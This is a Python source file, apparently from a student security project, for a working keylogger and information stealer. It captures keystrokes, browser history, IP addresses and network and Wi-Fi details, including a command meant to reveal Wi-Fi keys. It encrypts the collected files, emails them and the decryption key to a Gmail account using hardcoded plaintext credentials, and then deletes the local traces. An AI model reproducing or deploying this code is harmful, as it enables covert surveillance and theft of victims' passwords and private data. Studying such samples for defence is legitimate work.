import subprocess, socket, os, re, smtplib, \
        logging, pathlib, json, time, shutil
import requests
import browserhistory as bh
from multiprocessing import Process
from pynput.keyboard import Key, Listener
from scipy.io.wavfile import write as write_rec
from cryptography.fernet import Fernet
from email import encoders
import smtplib

# Keystroke Capture Funtion #
def logg_keys(file_path):
    logging.basicConfig(filename = (file_path + 'key_logs.txt'), 
        level=logging.DEBUG, format='%(asctime)s: %(message)s')

    on_press = lambda Key : logging.info(str(Key))
    with Listener(on_press=on_press) as listener:
        listener.join()

def sendEmail():
    import smtplib
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    from email.mime.base import MIMEBase
    from email.mime.application import MIMEApplication
    from email import encoders
    mail_content = '''Hello,
    Confidential information, use wisely!
    Thank You
    '''
    #The mail addresses and password
    sender_address = 'stest6411@gmail.com'
    sender_pass = 'unsw6411!'
    receiver_address = 'stest6411@gmail.com'
    #Setup the MIME
    message = MIMEMultipart()
    message['From'] = sender_address
    message['To'] = receiver_address
    message['Subject'] = 'A test mail sent by Python. It has an attachment.'


    log_file = 'browser.txt'
    attachment_1 = MIMEApplication(open("browser.txt", 'rb').read(), _subtype='txt')
    attachment_1.add_header('Content-Disposition', "attachment; filename= %s" % log_file)
    message.attach(attachment_1)

    log_file2 = 'system_info.txt'
    attachment_2 = MIMEApplication(open("system_info.txt", 'rb').read(), _subtype='txt')
    attachment_2.add_header('Content-Disposition', "attachment; filename= %s" % log_file2)
    message.attach(attachment_2)

    log_file3 = 'key.key'

    attachment_3 = MIMEApplication(open("key.key", 'rb').read(), _subtype='txt')
    attachment_3.add_header('Content-Disposition', "attachment; filename= %s" % log_file3)
    message.attach(attachment_3)

    log_file4 = 'key_logs.txt'

    attachment_4 = MIMEApplication(open("key_logs.txt", 'rb').read(), _subtype='txt')
    attachment_4.add_header('Content-Disposition', "attachment; filename= %s" % log_file4)
    message.attach(attachment_4)

    #'network_wifi.txt'

    log_file5 = 'network_wifi.txt'

    attachment_5 = MIMEApplication(open("network_wifi.txt", 'rb').read(), _subtype='txt')
    attachment_5.add_header('Content-Disposition', "attachment; filename= %s" % log_file5)
    message.attach(attachment_5)

    message.attach(MIMEText(mail_content, 'plain'))
    attach_file_name = 'browser.txt'
    attach_file = open(attach_file_name, 'rb') # Open the file as binary mode
    payload = MIMEBase('application', 'octate-stream')
    payload.set_payload((attach_file).read())
    encoders.encode_base64(payload) #encode the attachment
    #add payload header with filename
    payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
    message.attach(payload)
    #Create SMTP session for sending the mail
    session = smtplib.SMTP('smtp.gmail.com', 587) #use gmail with port
    session.starttls() #enable security
    session.login(sender_address, sender_pass) #login with mail_id and password
    text = message.as_string()
    session.sendmail(sender_address, receiver_address, text)
    session.quit()
    print('Mail Sent')

def write_key():
    """
    Generates a key and save it into a file
    """
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def load_key():
    """
    Loads the key from the current directory named `key.key`
    """
    return open("key.key", "rb").read()


def main():
    #pathlib.Path('C:/Users/Varun/Desktop/keylogger/logs').mkdir(parents=True, exist_ok=True)
    file_path = ''

#### Retrieve Network/Wifi informaton for the network_wifi file ################################################################
    with open(file_path + 'network_wifi.txt', 'a') as network_wifi:
        try:
            commands = subprocess.Popen([ 'netstat', 'export', 
                                        'key=clear', 
                                        '&', 'ipconfig', '/all', '&', 'arp', '-a', '&', 
                                        'getmac', '-V', '&', 'route', 'print', '&', 'netstat', '-a'], 
                                        stdout=network_wifi, stderr=network_wifi, shell=True)
            outs, errs = commands.communicate(timeout=60)

        except subprocess.TimeoutExpired:
            commands.kill()
            out, errs = commands.communicate()

##### Retrieve system information for the system_info file ######################################################################
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)

    with open(file_path + 'system_info.txt', 'a') as system_info:
        try:
            public_ip = requests.get('https://api.ipify.org').text
        except requests.ConnectionError:
            public_ip = '* Ipify connection failed *'
            pass

        system_info.write('Public IP Address: ' + public_ip + '\n' \
                          + 'Private IP Address: ' + IPAddr + '\n')
       


    browser_history = []
    bh_user = bh.get_username()
    db_path = bh.get_database_paths()
    hist = bh.get_browserhistory()
    browser_history.extend((bh_user, db_path, hist))
    with open(file_path + 'browser.txt', 'a') as browser_txt:
        browser_txt.write(json.dumps(browser_history))

    p1 = Process(target=logg_keys, args=(file_path,)) ; p1.start()

    p1.join(timeout=10) 

    p1.terminate()
    files = [ 'system_info.txt', 
            'browser.txt', 'key_logs.txt', 'network_wifi.txt' ]

    #encrypt    
    write_key()

    key = load_key()

    for file in files:
        f = Fernet(key)
        with open(file, "rb") as file1:
        # read all file data
            file_data = file1.read()

        encrypted_data = f.encrypt(file_data)
        #print(encrypted_data)

        # filename = str(file+'2.txt')
        # print(filename)
        with open(file, "wb") as file2:
            file2.write(encrypted_data)


    sendEmail()

    files = [ 'system_info.txt', 
            'browser.txt', 'key_logs.txt', 'key.key', 'network_wifi.txt' ]
            
    for file in files:
        os.remove(file)

    # Loop #
    #main()


if __name__ == '__main__':
    try:
        main()

    except KeyboardInterrupt:
        print('* Control-C entered...Program exiting *')

    except Exception as ex:
        logging.basicConfig(level=logging.DEBUG, \
                            filename='C:/Users/Public/Logs/error_log.txt')
        logging.exception('* Error Ocurred: {} *'.format(ex))
        pass
